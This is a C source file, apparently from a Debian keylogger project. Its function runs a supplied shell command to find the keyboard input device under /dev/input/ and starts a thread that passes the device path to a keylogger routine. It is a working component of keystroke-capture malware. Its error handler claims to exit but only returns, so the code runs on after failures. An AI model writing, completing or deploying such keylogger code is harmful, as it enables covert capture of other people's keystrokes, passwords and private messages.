#include <stdlib.h>
#include <stdio.h>  // popen()
#include <errno.h>  //errno
#include <string.h>  // strerror()

#include <pthread.h>

#include "../../includes/keylogger/log_keys.h"
#include "../../includes/keylogger/debian_keylogger_utils.h"


/*  Error management, print the function wish failed, the error number and the error message and exit with value of -1   */
void debian_error(const char *expression)
{
    printf("ERROR : %s\nError Number : %d\nError Message : %s\n", expression, errno, strerror(errno));
    return;
}

void debian_get_kb_device_filename(const char *command)
{
    //char buffer[128] = "";
    //char defaultPath[128] = "";
    //char *deviceFile = NULL;

    char *path = NULL;
    char temp[9];

    FILE *pipe = NULL;

    pthread_t thread_logger = 0;

    path = malloc(32 * sizeof(char));
    if(path == NULL)
        debian_error("malloc()\nFunction : debian_get_kb_device_filename()");

    strncpy(path, "/dev/input/", 11);

    /*  Open the pipe for execute the command line */
    pipe = popen(command, "r");
    if(pipe == NULL)
        debian_error("popen()\nFonction : debian_get_kb_device_filename()");

    /*  Put the result of the command in a buffer */
    if(fgets(temp, 7, pipe) == NULL)
        debian_error("fgets()\nFonction : debian_get_kb_device_filename()");

    pclose(pipe);

    //strdup(strncat(path, temp, strlen(temp) + 1));
    
    snprintf(path, 32, "%s%s", "/dev/input/", temp);
    
    printf("path = %s\n", path);

    if(pthread_create(&thread_logger, NULL, (void*)keylogger, path) == -1)
        debian_error("pthread_create()\nFonction : debian_get_kb_device_filename()");

    /*  Send the deviceFile to the keylogger fonction */
    //keylogger(deviceFile);

}

